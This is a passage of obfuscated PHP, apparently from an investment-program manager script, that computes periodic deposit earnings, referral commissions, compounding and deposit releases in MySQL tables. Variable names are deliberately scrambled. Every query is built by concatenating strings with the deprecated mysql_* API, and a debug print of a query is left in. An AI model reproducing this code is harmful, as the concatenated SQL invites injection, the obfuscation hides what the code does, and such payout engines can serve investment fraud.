                    		actual_amount = actual_amount + ' . $elnlcajRvg . '
                    		where id = ' . $elnlcMuwB[$elnlcebOCn['elnlcdfxo']];
                  (mysql_query ($q) OR print mysql_error ());
                }
              }

              elnlcqalmb ($elnlcMuwB[$elnlcebOCn['elnlcdfxo']], $elnlctAAR, 'date = \'' . $elnlcMuwB[$elnlcebOCn['elnlcxRqo']] . ('' . '\' + interval ' . $elnlcJBjo));
            }
          }

          $q = '' . 'update hm2_deposits set 
      	q_pays = q_pays + 1, 
      	last_pay_date = last_pay_date + interval ' . $elnlcJBjo . ' ' . $elnlcONjR . ' where id =' . $elnlcMuwB[$elnlcebOCn['elnlcdfxo']];
          (mysql_query ($q) OR print mysql_error ());
        }
      }

      $q = 'select * from hm2_types where q_days > 0';
      $elnlcaJzM = mysql_query ($q);
      while ($elnlcMuwB = mysql_fetch_array ($elnlcaJzM))
      {
        if ($elnlcMuwB[$elnlcebOCn['elnlcQulec']] == 1)
        {
          $elnlcHWuCT = floor ($elnlcMuwB[$elnlcebOCn['elnlcJnlR']] / 5) * 7 + $elnlcMuwB[$elnlcebOCn['elnlcJnlR']] % 5;
          $elnlcVxcCV = $elnlcMuwB[$elnlcebOCn['elnlcSESNT']] - (0 < $elnlcMuwB[$elnlcebOCn['elnlcSESNT']] ? 1 : 0);
          $elnlcfUBS = '' . ' (' . $elnlcHWuCT . ' + ((' . $elnlcMuwB[$elnlcebOCn['elnlcJnlR']] . ' % 5 + WEEKDAY(deposit_date)) > 5)*2 + ' . $elnlcVxcCV . ') ';
        }
        else
        {
          $elnlcHWuCT = $elnlcMuwB[$elnlcebOCn['elnlcJnlR']] + $elnlcMuwB[$elnlcebOCn['elnlcSESNT']] - (0 < $elnlcMuwB[$elnlcebOCn['elnlcSESNT']] ? 1 : 0);
          $elnlcfUBS = '' . ' ' . $elnlcHWuCT . ' ';
        }

        $elnlcuIrtW = $elnlcMuwB[$elnlcebOCn['elnlcdfxo']];
        if ($elnlcMuwB[$elnlcebOCn['elnlcECdHB']] == 1)
        {
          $q = '' . 'select * from hm2_deposits where 
                type_id = ' . $elnlcuIrtW . ' and 
                status = \'on\' and 
                user_id = ' . $elnlczfrLe . ' and 
                (
                   deposit_date + interval ' . $elnlcfUBS . ' ' . ($elnlcMuwB[$elnlcebOCn['elnlcWLwD']] == $elnlcebOCn['elnlcnepOu'] ? 'hour' : 'day') . ('' . ' < last_pay_date
                      or
                   deposit_date + interval ' . $elnlcfUBS . ' ') . ($elnlcMuwB[$elnlcebOCn['elnlcWLwD']] == $elnlcebOCn['elnlcnepOu'] ? 'hour' : 'day') . ('' . ' < now()
                )
                and
                (
                   (' . $elnlcMuwB[$elnlcebOCn['elnlcJGsj']] . ' = 0) || (' . $elnlcMuwB[$elnlcebOCn['elnlcJGsj']] . ' && (deposit_date + interval ' . $elnlcMuwB[$elnlcebOCn['elnlcqTPw']] . ' ') . ($elnlcMuwB[$elnlcebOCn['elnlcWLwD']] == $elnlcebOCn['elnlcnepOu'] ? 'hour' : 'day') . ' < now())))
             ';
          $elnlcdQvlB = mysql_query ($q);
          while ($elnlckicWw = mysql_fetch_array ($elnlcdQvlB))
          {
            $q = 'insert into hm2_history set
                user_id = ' . $elnlckicWw[$elnlcebOCn['elnlcREbrh']] . ',
      		amount = ' . $elnlckicWw[$elnlcebOCn['elnlcdIzRV']] . ',
      		type=\'release_deposit\',
      		actual_amount = ' . $elnlckicWw[$elnlcebOCn['elnlcdIzRV']] . ',
                ec = ' . $elnlckicWw[$elnlcebOCn['elnlcuNubW']] . ',
      		date = \'' . $elnlckicWw[$elnlcebOCn['elnlclltKC']] . ('' . '\' + interval ' . $elnlcHWuCT . ' ') . ($elnlcMuwB[$elnlcebOCn['elnlcWLwD']] == $elnlcebOCn['elnlcnepOu'] ? 'hour' : 'day') . ',
                deposit_id = ' . $elnlckicWw[$elnlcebOCn['elnlcdfxo']];
            (mysql_query ($q) OR print mysql_error ());
          }
        }

        $q = '' . 'update hm2_deposits set status=\'off\' where 
             user_id = ' . $elnlczfrLe . ' and 
    	       (deposit_date + interval ' . $elnlcfUBS . ' ' . ($elnlcMuwB[$elnlcebOCn['elnlcWLwD']] == $elnlcebOCn['elnlcnepOu'] ? 'hour' : 'day') . ('' . ' < last_pay_date
                  or
                deposit_date + interval ' . $elnlcfUBS . ' ') . ($elnlcMuwB[$elnlcebOCn['elnlcWLwD']] == $elnlcebOCn['elnlcnepOu'] ? 'hour' : 'day') . ('' . ' < now()) and
               ((' . $elnlcMuwB[$elnlcebOCn['elnlcJGsj']] . ' = 0) || (' . $elnlcMuwB[$elnlcebOCn['elnlcJGsj']] . ' && (deposit_date + interval ' . $elnlcMuwB[$elnlcebOCn['elnlcqTPw']] . ' ') . ($elnlcMuwB[$elnlcebOCn['elnlcWLwD']] == $elnlcebOCn['elnlcnepOu'] ? 'hour' : 'day') . ('' . ' < now()))) and
             type_id = ' . $elnlcuIrtW . '
           ');
        (mysql_query ($q) OR print mysql_error ());
      }
    }

  }

  function elnlcmhhdv ($elnlcfbyH)
  {
    global $elnlcebOCn;
    global $elnlcroEyb;
    $elnlcdqPPA = array ();
    if (($elnlcroEyb[$elnlcebOCn['elnlcueEm']] == 1 AND $elnlcfbyH != -2))
    {
      return null;
    }

    $q = 'select hm2_plans.* from hm2_plans, hm2_types where hm2_types.status = \'on\' and hm2_types.id = hm2_plans.parent order by parent, min_deposit';
    ($elnlcaJzM = mysql_query ($q) OR print mysql_error ());
    while ($elnlcMuwB = mysql_fetch_array ($elnlcaJzM))
    {
      $elnlcdqPPA[$elnlcMuwB[$elnlcebOCn['elnlcomxrc']]][$elnlcMuwB[$elnlcebOCn['elnlcdfxo']]] = $elnlcMuwB;
    }

    $elnlcRHhI = $elnlcebOCn['elnlciREG'];
    $elnlciBVQW = 'u.last_access_time + interval 30 minute < now() ';
    if ($elnlcroEyb[$elnlcebOCn['elnlchTiBm']] == $elnlcebOCn['elnlcnuRp'])
    {
      $elnlcaPEuA = 't.send_profit_to_stocks,t.send_percent_to_stocks';
      $elnlcUhRJJ = ' t.pay_by_button = 0 and';
    }

    if ($elnlcfbyH == -1)
    {
      $elnlciBVQW = '1 = 1';
      $q = 'select * from hm2_users where l_e_t + interval 15 minute < now() and status = \'on\'';
    }
    else
    {
      $q = '' . 'select * from hm2_users where id = ' . $elnlcfbyH . ' and status = \'on\'';
    }

    if ($elnlcfbyH == -2)
    {
      $q = 'select * from hm2_users where status = \'on\'';
      $q = 'select distinct user_id as id from hm2_deposits where to_days(last_pay_date) < to_days(now()) order by user_id';
    }

    ($elnlcLvIi = mysql_query ($q) OR print mysql_error ());
    while ($elnlcnHamw = mysql_fetch_array ($elnlcLvIi))
    {
      $elnlczfrLe = $elnlcnHamw[$elnlcebOCn['elnlcdfxo']];
      $elnlcdNpUt = fopen ('' . './tmpl_c/lock_user' . $elnlczfrLe, 'w+');
      if (flock ($elnlcdNpUt, LOCK_EX))
      {
      }
      else
      {
        fclose ($elnlcdNpUt);
        continue;
      }

      $q = '' . 'update hm2_users set l_e_t = now() where id = ' . $elnlczfrLe;
      (mysql_query ($q) OR print mysql_error ());
      $elnlcRHhI = $elnlcebOCn['elnlciREG'];
      $q = 'select max(p.min_deposit) as min_deposit, p.parent as type_id from hm2_plans as p group by p.parent';
      ($elnlcaJzM = mysql_query ($q) OR print mysql_error ());
      while ($elnlcMuwB = mysql_fetch_array ($elnlcaJzM))
      {
        $q = '' . 'select max_deposit as max_amount from hm2_plans where parent = ' . $elnlcMuwB[$elnlcebOCn['elnlcPPdPx']] . ' and min_deposit = ' . $elnlcMuwB[$elnlcebOCn['elnlcSTGg']];
        ($elnlcDTsPf = mysql_query ($q) OR print mysql_error ());
        while ($elnlcgKLwu = mysql_fetch_array ($elnlcDTsPf))
        {
          $elnlcgyAc[$elnlcMuwB[$elnlcebOCn['elnlcPPdPx']]] = $elnlcgKLwu[$elnlcebOCn['elnlcGgdA']];
        }
      }

      while (0 < $elnlcRHhI)
      {
        $q = '' . 'select 
              d.*, 
              t.period as period, t.use_compound as use_compound,
              t.compound_min_deposit, t.compound_max_deposit,
              t.compound_min_percent, t.compound_max_percent,
              t.compound_percents_type, t.compound_percents,
/*              t.rpcp as rpcp,*/
              t.work_week as work_week,
              t.q_days as q_days, t.withdraw_principal,
              t.delay as delay,
              (d.deposit_date + interval t.withdraw_principal_duration day < now()) wp_ok,
              ' . $elnlcaPEuA . '
              t.return_profit as return_profit,
              t.return_profit_percent as return_profit_percent
            from
              hm2_deposits as d,
              hm2_types as t,
              hm2_users as u
            where 
              u.id = ' . $elnlczfrLe . ' and 
              u.status = \'on\' and 
              d.status=\'on\' and 
              d.type_id = t.id and 
              t.status = \'on\' and 
              u.id = d.user_id and
              ' . $elnlcUhRJJ . '
              (((t.q_days + t.delay - 1*(t.delay > 0)) > ((UNIX_TIMESTAMP(d.last_pay_date) - UNIX_TIMESTAMP(d.deposit_date)) / if(t.period = \'h\', 60*60, 60*60*24))) or t.q_days = 0) and 
              (
                (d.last_pay_date + interval 1 hour <= now() and t.period = \'h\')or
                (d.last_pay_date + interval 1 day <= now() and t.period = \'d\')or
                (d.last_pay_date + interval 7 day <= now() and t.period = \'w\') or
                (d.last_pay_date + interval 14 day <= now() and t.period = \'b-w\') or
                (d.last_pay_date + interval 1 month <= now() and t.period = \'m\') or
                (d.last_pay_date + interval 2 month <= now() and t.period = \'2m\') or
                (d.last_pay_date + interval 3 month <= now() and t.period = \'3m\') or
                (d.last_pay_date + interval 6 month <= now() and t.period = \'6m\') or
                (d.last_pay_date + interval 1 year <= now() and t.period = \'y\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day <= now() and t.period = \'end\') 
              ) and
              ((t.q_days = 0) or 
                (               
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) hour >= d.last_pay_date and t.period = \'h\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date and t.period = \'d\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 7 day and t.period = \'w\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 14 day  and t.period = \'b-w\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 1 month  and t.period = \'m\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 2 month  and t.period = \'2m\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 3 month  and t.period = \'3m\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 6 month  and t.period = \'6m\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 1 year and t.period = \'y\') or
                (t.q_days > 0 and t.period = \'end\') 
              ))';
        ($elnlcaJzM = mysql_query ($q) OR print mysql_error ());
        $elnlcRHhI = $elnlcebOCn['elnlcMkRzz'];
        while ($elnlcMuwB = mysql_fetch_array ($elnlcaJzM))
        {
          ++$elnlcRHhI;
          if (!isset ($elnlcdqPPA[$elnlcMuwB[$elnlcebOCn['elnlcPPdPx']]]))
          {
            continue;
          }

          $elnlcGRpDe = $elnlcebOCn['elnlcMkRzz'];
          $elnlcdoNrO = $elnlcebOCn['elnlcMkRzz'];
          reset ($elnlcdqPPA);
          reset ($elnlcdqPPA[$elnlcMuwB[$elnlcebOCn['elnlcPPdPx']]]);
          while (list ($elnlceUGI, $elnlcSMRUm) = each ($elnlcdqPPA[$elnlcMuwB[$elnlcebOCn['elnlcPPdPx']]]))
          {
            if (($elnlcSMRUm[$elnlcebOCn['elnlcSTGg']] <= $elnlcMuwB[$elnlcebOCn['elnlcdIzRV']] AND ($elnlcMuwB[$elnlcebOCn['elnlcdIzRV']] <= $elnlcSMRUm[$elnlcebOCn['elnlcStkL']] OR $elnlcSMRUm[$elnlcebOCn['elnlcStkL']] == 0)))
            {
              $elnlcGRpDe = $elnlcSMRUm[$elnlcebOCn['elnlclWRL']];
            }

            if (($elnlcMuwB[$elnlcebOCn['elnlcdIzRV']] < $elnlcSMRUm[$elnlcebOCn['elnlcSTGg']] AND $elnlcGRpDe == 0))
            {
              $elnlcGRpDe = $elnlcdoNrO;
            }

            if (($elnlcMuwB[$elnlcebOCn['elnlcdIzRV']] < $elnlcSMRUm[$elnlcebOCn['elnlcSTGg']] AND 0 < $elnlcGRpDe))
            {
              break;
            }

            $elnlcdoNrO = $elnlcSMRUm[$elnlcebOCn['elnlclWRL']];
          }

          if (($elnlcSMRUm[$elnlcebOCn['elnlcStkL']] != 0 AND $elnlcSMRUm[$elnlcebOCn['elnlcStkL']] < $elnlcMuwB[$elnlcebOCn['elnlcdIzRV']]))
          {
            $elnlcGRpDe = $elnlcdoNrO;
          }

          $elnlctAAR = $elnlcMuwB[$elnlcebOCn['elnlcdIzRV']] * $elnlcGRpDe / 100;
          $elnlcJBjo = '';
          if ($elnlcMuwB[$elnlcebOCn['elnlcWLwD']] == $elnlcebOCn['elnlcdcUM'])
          {
            $elnlcJBjo = ' 1 day ';
          }
          else
          {
            if ($elnlcMuwB[$elnlcebOCn['elnlcWLwD']] == $elnlcebOCn['elnlcnepOu'])
            {
              $elnlcJBjo = ' 1 hour ';
            }
            else
            {
              if ($elnlcMuwB[$elnlcebOCn['elnlcWLwD']] == $elnlcebOCn['elnlcOjqv'])
              {
                $elnlcJBjo = ' 7 day ';
              }
              else
              {
                if ($elnlcMuwB[$elnlcebOCn['elnlcWLwD']] == 'b-w')
                {
                  $elnlcJBjo = ' 14 day ';
                }
                else
                {
                  if ($elnlcMuwB[$elnlcebOCn['elnlcWLwD']] == $elnlcebOCn['elnlcndCCA'])
                  {
                    $elnlcJBjo = ' 1 month ';
                  }
                  else
                  {
                    if ($elnlcMuwB[$elnlcebOCn['elnlcWLwD']] == $elnlcebOCn['elnlcUJuca'])
                    {
                      $elnlcJBjo = ' 2 month ';
                    }
                    else
                    {
                      if ($elnlcMuwB[$elnlcebOCn['elnlcWLwD']] == $elnlcebOCn['elnlcmKFT'])
                      {
                        $elnlcJBjo = ' 3 month ';
                      }
                      else
                      {
                        if ($elnlcMuwB[$elnlcebOCn['elnlcWLwD']] == $elnlcebOCn['elnlcwVAV'])
                        {
                          $elnlcJBjo = ' 6 month ';
                        }
                        else
                        {
                          if ($elnlcMuwB[$elnlcebOCn['elnlcWLwD']] == $elnlcebOCn['elnlccnjUF'])
                          {
                            $elnlcJBjo = ' 1 year ';
                          }
                          else
                          {
                            if ($elnlcMuwB[$elnlcebOCn['elnlcWLwD']] == $elnlcebOCn['elnlcOWeSR'])
                            {
                              $elnlcJBjo = ' ' . $elnlcMuwB[$elnlcebOCn['elnlcJnlR']] . ' day ';
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }

          if (($elnlcGRpDe == 0 AND $elnlcJBjo == ''))
          {
            continue;
          }

          $elnlcbJRz = -1;
          $q = 'select weekday(\'' . $elnlcMuwB[$elnlcebOCn['elnlcxRqo']] . ('' . '\' + interval ' . $elnlcJBjo . ') as dw');
          ($elnlcDTsPf = mysql_query ($q) OR print mysql_error ());
          while ($elnlcgKLwu = mysql_fetch_array ($elnlcDTsPf))
          {
            $elnlcbJRz = $elnlcgKLwu[$elnlcebOCn['elnlckWIE']];
          }

          $q = 'select count(id) as `col` from hm2_history where 
		type = \'earning\' and ' . ($elnlcMuwB[$elnlcebOCn['elnlcWLwD']] == $elnlcebOCn['elnlcnepOu'] ? ' date_format(date, \'%Y-%m-%d  %H\') = date_format(\'' . $elnlcMuwB[$elnlcebOCn['elnlcxRqo']] . ('' . '\' + interval ' . $elnlcJBjo . ', \'%Y-%m-%d  %H\') and') : 'to_days(date) = to_days(\'' . $elnlcMuwB[$elnlcebOCn['elnlcxRqo']] . ('' . '\' + interval ' . $elnlcJBjo . ') and ')) . ' deposit_id = ' . $elnlcMuwB[$elnlcebOCn['elnlcdfxo']];
          ($elnlcLxDNR = mysql_query ($q) OR print mysql_error ());
          $elnlcNSMEL = $elnlcebOCn['elnlcMkRzz'];
          while ($elnlciJMKa = mysql_fetch_array ($elnlcLxDNR))
          {
            $elnlcNSMEL = $elnlciJMKa[$elnlcebOCn['elnlclbIq']];
          }

          if ($elnlcNSMEL == 0)
          {
            if ((5 <= $elnlcbJRz AND $elnlcMuwB[$elnlcebOCn['elnlcQulec']] == 1))
            {
              $q = 'insert into hm2_history set user_id = ' . $elnlcMuwB[$elnlcebOCn['elnlcREbrh']] . ',
                    amount = 0,
                    type = \'earning\',
                    description = \'No interest on ' . ($elnlcbJRz == 5 ? 'Saturday' : 'Sunday') . '\',
                    actual_amount = 0,
                    date = \'' . $elnlcMuwB[$elnlcebOCn['elnlcxRqo']] . ('' . '\' + interval ' . $elnlcJBjo . ',
                    ec = ') . $elnlcMuwB[$elnlcebOCn['elnlcuNubW']] . ',
                    str = \'gg\',
                    deposit_id = ' . $elnlcMuwB[$elnlcebOCn['elnlcdfxo']];
              (mysql_query ($q) OR print mysql_error ());
            }
            else
            {
              $q = 'insert into hm2_history set user_id = ' . $elnlcMuwB[$elnlcebOCn['elnlcREbrh']] . ('' . ',
                    amount = ' . $elnlctAAR . ',
                    type = \'earning\',
                    description = \'Earning from deposit ') . $elnlcroEyb[$elnlcebOCn['elnlcDOlB']] . number_format ($elnlcMuwB[$elnlcebOCn['elnlcdIzRV']], 2) . ('' . ' - ' . $elnlcGRpDe . ' %\',
                    actual_amount = ' . $elnlctAAR . ',
                    date = \'') . $elnlcMuwB[$elnlcebOCn['elnlcxRqo']] . ('' . '\' + interval ' . $elnlcJBjo . ',
                    ec = ') . $elnlcMuwB[$elnlcebOCn['elnlcuNubW']] . ',
                    str = \'gg\',
                    deposit_id = ' . $elnlcMuwB[$elnlcebOCn['elnlcdfxo']];
              (mysql_query ($q) OR print mysql_error ());
              if ($elnlcroEyb[$elnlcebOCn['elnlchTiBm']] == $elnlcebOCn['elnlcdwabS'])
              {
                if ((0 < $elnlcnHamw[$elnlcebOCn['elnlclOTV']] AND 0 < $elnlcroEyb[$elnlcebOCn['elnlcvgwml']]))
                {
                  $elnlcMbFz = $elnlctAAR * $elnlcroEyb[$elnlcebOCn['elnlcvgwml']] / 100;
                  $elnlcORnj = elnlcxfvdc ($elnlcnHamw[$elnlcebOCn['elnlcAsniz']]);
                  if ($elnlcroEyb[$elnlcebOCn['elnlcURcu']] <= $elnlcMuwB[$elnlcebOCn['elnlcdIzRV']])
                  {
                    $q = '' . 'select max(actual_amount) as maxam from hm2_deposits where user_id = ' . $elnlcnHamw[$elnlcebOCn['elnlclOTV']] . ' and status = \'on\'';
                    ($elnlcDTsPf = mysql_query ($q) OR print mysql_error ());
                    $elnlcwkNQy = $elnlcebOCn['elnlcMkRzz'];
                    while ($elnlcgKLwu = mysql_fetch_array ($elnlcDTsPf))
                    {
                      $elnlcwkNQy = $elnlcgKLwu[$elnlcebOCn['elnlcovycQ']];
                    }

                    if ($elnlcroEyb[$elnlcebOCn['elnlcszORA']] <= $elnlcwkNQy)
                    {
                      $q = '' . 'insert into hm2_history set user_id = ' . $elnlcnHamw[$elnlcebOCn['elnlclOTV']] . ',
			amount = ' . $elnlcMbFz . ',
			type = \'commissions\',
			description = \'Daily referral earning from user ' . $elnlcORnj . '\',
			actual_amount = ' . $elnlcMbFz . ',
			date = \'' . $elnlcMuwB[$elnlcebOCn['elnlcxRqo']] . ('' . '\' + interval ' . $elnlcJBjo . ',
                        ec = ' . $elnlcMuwB[$elnlcebOCn['elnlcuNubW']] . ',
			str = \'gg\'');
                      (mysql_query ($q) OR print mysql_error ());
                    }
                  }
                }
              }

              if (($elnlcroEyb[$elnlcebOCn['elnlchTiBm']] == $elnlcebOCn['elnlcnuRp'] AND $elnlcMuwB[$elnlcebOCn['elnlcjNoi']]))
              {
                $elnlcgFNu = floor ($elnlctAAR * $elnlcMuwB[$elnlcebOCn['elnlcePeNg']]) / 100;
                if (0 < $elnlcgFNu)
                {
                  $q = 'insert into hm2_history set user_id = ' . $elnlcMuwB[$elnlcebOCn['elnlcREbrh']] . ('' . ',
                      amount = -' . $elnlcgFNu . ',
                      type = \'penality\',
                      description = \'Earning moved to Stocks account\',
                      actual_amount = -' . $elnlcgFNu . ',
                      date = \'') . $elnlcMuwB[$elnlcebOCn['elnlcxRqo']] . ('' . '\' + interval ' . $elnlcJBjo . ',
                      ec = ') . $elnlcMuwB[$elnlcebOCn['elnlcuNubW']] . ',
                      str = \'gg\',
                      deposit_id = ' . $elnlcMuwB[$elnlcebOCn['elnlcdfxo']];
                  (mysql_query ($q) OR print mysql_error ());
                  $q = 'insert into sh2_history set user_id = ' . $elnlcMuwB[$elnlcebOCn['elnlcREbrh']] . ('' . ',
                      amount = ' . $elnlcgFNu . ',
                      type = \'bonus\',
                      description = \'Earning received to buy shares\',
                      actual_amount = ' . $elnlcgFNu . ',
                      date = \'') . $elnlcMuwB[$elnlcebOCn['elnlcxRqo']] . ('' . '\' + interval ' . $elnlcJBjo . ',
                      ec = ') . $elnlcMuwB[$elnlcebOCn['elnlcuNubW']] . ',
                      str = \'gg\'';
                  (mysql_query ($q) OR print mysql_error ());
                }
              }
            }
          }

          $elnlcONjR = '';
          if ($elnlcMuwB[$elnlcebOCn['elnlcWLwD']] == $elnlcebOCn['elnlcOWeSR'])
          {
            if (($elnlcMuwB[$elnlcebOCn['elnlcJGsj']] == 0 OR ($elnlcMuwB[$elnlcebOCn['elnlcJGsj']] AND $elnlcMuwB[$elnlcebOCn['elnlcksWM']])))
            {
              $elnlcONjR = ', status = \'off\'';
            }

            if (($elnlcMuwB[$elnlcebOCn['elnlcECdHB']] == 1 AND ($elnlcMuwB[$elnlcebOCn['elnlcJGsj']] == 0 OR ($elnlcMuwB[$elnlcebOCn['elnlcJGsj']] AND $elnlcMuwB[$elnlcebOCn['elnlcksWM']]))))
            {
              $elnlcLlSxk = $elnlcMuwB[$elnlcebOCn['elnlcdIzRV']];
              $q = 'insert into hm2_history set user_id = ' . $elnlcMuwB[$elnlcebOCn['elnlcREbrh']] . ',
                    amount = ' . $elnlcMuwB[$elnlcebOCn['elnlcdIzRV']] . ',
                    type=\'release_deposit\',
                    actual_amount = ' . $elnlcLlSxk . ',
                    ec = ' . $elnlcMuwB[$elnlcebOCn['elnlcuNubW']] . ('' . ',
                    date = \'' . $elnlcMuwB[$elnlcebOCn['elnlcxRqo']] . '\' + interval ' . $elnlcJBjo . ',
                    deposit_id = ') . $elnlcMuwB[$elnlcebOCn['elnlcdfxo']] . ',
                    description = \'Deposit release\'';
              (mysql_query ($q) OR print mysql_error ());
              if ($elnlcroEyb[$elnlcebOCn['elnlchTiBm']] == $elnlcebOCn['elnlcJEWdB'])
              {
                if (0 < $elnlcMuwB[$elnlcebOCn['elnlcKAJw']])
                {
                  $q = '' . 'select sum(actual_amount) as amt from hm2_history where deposit_id = ' . $elnlcMuwB[$elnlcebOCn['elnlcdfxo']] . ' and type = \'earning\' and user_id = ' . $elnlcMuwB[$elnlcebOCn['elnlcREbrh']];
                  print $q;
                  ($elnlcQGrnd = mysql_query ($q) OR print mysql_error ());
                  $elnlcOLUKC = $elnlcebOCn['elnlcMkRzz'];
                  while ($elnlcBgsoF = mysql_fetch_array ($elnlcQGrnd))
                  {
                    $elnlcOLUKC = $elnlcBgsoF[$elnlcebOCn['elnlclblp']];
                  }

                  $elnlcKQRDG = ($elnlcLlSxk + $elnlcOLUKC) * $elnlcMuwB[$elnlcebOCn['elnlcKAJw']] / 100;
                  $elnlcVxcCV = intval ($elnlcMuwB[$elnlcebOCn['elnlcSESNT']]);
                  $q = '' . 'insert into hm2_deposits set 
		           user_id = ' . $elnlcMuwB[$elnlcebOCn['elnlcREbrh']] . ',
		           type_id = ' . $elnlcMuwB[$elnlcebOCn['elnlcPPdPx']] . ',
		           deposit_date = \'' . $elnlcMuwB[$elnlcebOCn['elnlcxRqo']] . '\' + interval ' . $elnlcJBjo . ',
		           last_pay_date = (\'' . $elnlcMuwB[$elnlcebOCn['elnlcxRqo']] . '\' + interval ' . $elnlcJBjo . ') + interval ' . $elnlcVxcCV . ' day,
		           status = \'on\',
		           amount = ' . $elnlcKQRDG . ',
		           actual_amount = ' . $elnlcKQRDG . ',
		           compound = 0,
		           ec = ' . $elnlcMuwB[$elnlcebOCn['elnlcuNubW']] . '    ';
                  (mysql_query ($q) OR print mysql_error ());
                  $elnlcDRwe = mysql_insert_id ();
                  $q = '' . 'insert into hm2_history set 
		           user_id = ' . $elnlcMuwB[$elnlcebOCn['elnlcREbrh']] . ',
		           amount = -' . $elnlcKQRDG . ',
		           actual_amount = -' . $elnlcKQRDG . ',
		           type=\'deposit\',
		           date = \'' . $elnlcMuwB[$elnlcebOCn['elnlcxRqo']] . '\' + interval ' . $elnlcJBjo . ',
		           description = \'Deposit (reinvest)\',
		           ec = ' . $elnlcMuwB[$elnlcebOCn['elnlcuNubW']] . ',
		           deposit_id = ' . $elnlcDRwe . '    ';
                  (mysql_query ($q) OR print mysql_error ());
                }
              }
            }
          }
          else
          {
            if ((5 <= $elnlcbJRz AND $elnlcMuwB[$elnlcebOCn['elnlcQulec']] == 1))
            {
            }
            else
            {
              if (((0 < $elnlcMuwB[$elnlcebOCn['elnlcKAJw']] AND $elnlcMuwB[$elnlcebOCn['elnlcKAJw']] <= 100) AND $elnlcMuwB[$elnlcebOCn['elnlcNPfGR']] == 1))
              {
                if ($elnlcMuwB[$elnlcebOCn['elnlcRtrt']] == 0)
                {
                  $elnlcMuwB[$elnlcebOCn['elnlcRtrt']] = $elnlcMuwB[$elnlcebOCn['elnlcdIzRV']] + 1;
                }

                if (($elnlcMuwB[$elnlcebOCn['elnlclvlF']] <= $elnlcMuwB[$elnlcebOCn['elnlcdIzRV']] AND $elnlcMuwB[$elnlcebOCn['elnlcdIzRV']] <= $elnlcMuwB[$elnlcebOCn['elnlcRtrt']]))
                {
                  if ($elnlcMuwB[$elnlcebOCn['elnlcmoxNv']] == 1)
                  {
                    $elnlcAmNI = preg_split ('/\\s*,\\s*/', $elnlcMuwB[$elnlcebOCn['elnlcnhPg']]);
                    if (!in_array ($elnlcMuwB[$elnlcebOCn['elnlcKAJw']], $elnlcAmNI))
                    {
                      $elnlcMuwB[$elnlcebOCn['elnlcKAJw']] = $elnlcAmNI[0];
                    }
                  }
                  else
                  {
                    if ($elnlcMuwB[$elnlcebOCn['elnlcKAJw']] < $elnlcMuwB[$elnlcebOCn['elnlcUSya']])
                    {
                      $elnlcMuwB[$elnlcebOCn['elnlcKAJw']] = $elnlcMuwB[$elnlcebOCn['elnlcUSya']];
                    }

                    if ($elnlcMuwB[$elnlcebOCn['elnlcmVtNR']] < $elnlcMuwB[$elnlcebOCn['elnlcKAJw']])
                    {
                      $elnlcMuwB[$elnlcebOCn['elnlcKAJw']] = $elnlcMuwB[$elnlcebOCn['elnlcmVtNR']];
                    }
                  }
                }
                else
                {
                  $elnlcMuwB[$elnlcebOCn['elnlcKAJw']] = $elnlcebOCn['elnlcMkRzz'];
                }

                if ((0 < $elnlcMuwB[$elnlcebOCn['elnlcKAJw']] AND $elnlcMuwB[$elnlcebOCn['elnlcKAJw']] <= 100))
                {
                  $elnlcajRvg = $elnlctAAR * $elnlcMuwB[$elnlcebOCn['elnlcKAJw']] / 100;
                  $elnlctAAR = floor ((floor ($elnlctAAR * 100000) / 100000 - floor ($elnlcajRvg * 100000) / 100000) * 100) / 100;
                  if (($elnlcgyAc[$elnlcMuwB[$elnlcebOCn['elnlcPPdPx']]] == 0 OR $elnlcMuwB[$elnlcebOCn['elnlcdIzRV']] + $elnlcajRvg < $elnlcgyAc[$elnlcMuwB[$elnlcebOCn['elnlcPPdPx']]]))
                  {
                    $q = 'insert into hm2_history set user_id = ' . $elnlcMuwB[$elnlcebOCn['elnlcREbrh']] . ('' . ',
                        amount = -' . $elnlcajRvg . ',
                    		type=\'deposit\',
                    		description = \'Compounding deposit\',
                    		actual_amount = -' . $elnlcajRvg . ',
                    		ec = ') . $elnlcMuwB[$elnlcebOCn['elnlcuNubW']] . ',
                    		date = \'' . $elnlcMuwB[$elnlcebOCn['elnlcxRqo']] . ('' . '\' + interval ' . $elnlcJBjo . ',
                                deposit_id = ') . $elnlcMuwB[$elnlcebOCn['elnlcdfxo']];
                    (mysql_query ($q) OR print mysql_error ());
                    $q = '' . 'update hm2_deposits set amount = amount + ' . $elnlcajRvg . ',
                    		actual_amount = actual_amount + ' . $elnlcajRvg . '
                    		where id = ' . $elnlcMuwB[$elnlcebOCn['elnlcdfxo']];
                    (mysql_query ($q) OR print mysql_error ());
                  }
                }
              }

              elnlcqalmb ($elnlcMuwB[$elnlcebOCn['elnlcdfxo']], $elnlctAAR, 'date = \'' . $elnlcMuwB[$elnlcebOCn['elnlcxRqo']] . ('' . '\' + interval ' . $elnlcJBjo));
            }
          }

          $q = '' . 'update hm2_deposits set 
      	q_pays = q_pays + 1, 
      	last_pay_date = last_pay_date + interval ' . $elnlcJBjo . ' ' . $elnlcONjR . ' where id =' . $elnlcMuwB[$elnlcebOCn['elnlcdfxo']];
          (mysql_query ($q) OR print mysql_error ());
        }
      }

      if ($elnlcroEyb[$elnlcebOCn['elnlchTiBm']] == $elnlcebOCn['elnlcnuRp'])
      {
        $q = 'select * from hm2_types where q_days > 0 and pay_by_button != 1';
      }
      else
      {
        $q = 'select * from hm2_types where q_days > 0';
      }

      $elnlcaJzM = mysql_query ($q);
      while ($elnlcMuwB = mysql_fetch_array ($elnlcaJzM))
      {
